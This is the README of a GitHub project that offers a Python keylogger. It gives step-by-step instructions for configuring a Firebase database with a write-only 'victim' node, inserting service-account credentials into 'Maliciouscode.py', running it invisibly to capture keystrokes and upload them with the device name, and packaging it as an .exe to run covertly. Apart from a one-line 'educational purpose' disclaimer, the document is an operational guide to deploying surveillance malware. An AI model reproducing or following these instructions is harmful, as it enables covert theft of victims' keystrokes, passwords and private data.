# keylogger-using-firebase
# Overview
This projects shows keylogger attack is performed and to show how does it works.....Basically, this project uses `keyboard` library to record the keys which the user is pressing until `enter` key is pressed. Now the recorded keys are converted into a string and it's stored in your Firebase database with the `device name`.

# Steps to Initialize
Open your terminal before performing the following steps

## Installing packages
1. git clone https://github.com/SamCharles2003/keylogger-using-firebase
2. cd keylogger-using-firebase
3. pip install requirements.txt

## Setting up firebase
1. Go to [Google Firebase](https://console.firebase.google.com) using any browser and create your new project by giving its name.
2. Once you open your project, Select `Realtime Database` under `Build` dropdown box.
3. Configure the database location by selecting `South-east-asia` then update the rule by replacing the existing one with the following one

    {
  "rules": {
    "victim": {
      ".read": false,
      ".write":true
    }
  }
}

4. And hit ok to finialize the setup.
5. Once everything's set you can see your database link followed with this symbol 🔗. Copy this you will need this . And that's the database link.
6.  At the left-top you can see a option called `Project Overview` followed with this symbol 🏠. just beneath the Firebase Logo. Click on the settings ⚙ and select `Project Settings` 
7.  Now Select `Service accounts` from the above options
8.  Once `Service accounts` appears select `python` option under `Admin SDK configuration snippet` line.
9.  Click `Generate Private Key` and ` Generate`. Now a ` .json` file will be downloaded, open that with any code editors or text editors(Right click on downloaded .json file-> Open with -> Select Notepad)
10.  Copy the Contents inside the `Curly Braces {}` this is our firebase Credentials.

## Modification in code
1. Open `Maliciouscode.py` using any code editors(Pycharm,VScode). Find `firebase_cred` (13th Line) variable and paste your fire credentials inside those `Curly Braces {}`
2. Now find `firebase_admin.initialize_app(cred, {'databaseURL': ''})` (17th line). Now paste your database link inside those single quotes.
3. Now Save the code and initialization in completed here.

# Working 
Just run the code from your code editor. You cannot see anything that shows that the keylogger is working. But, type something and hit enter. Check your Firebase you can find that the keys which are press under /victims .

# Additional 

Instead of using this in your code editor, you can convert the code into a .exe file using `Auto-py-to-exe` and turn that ON to work anonymously. You can close it through task manager or just simply restarting the machine

# Note: This project is meant for educational purpose. Doing unethical behavior using this is not appreciated.
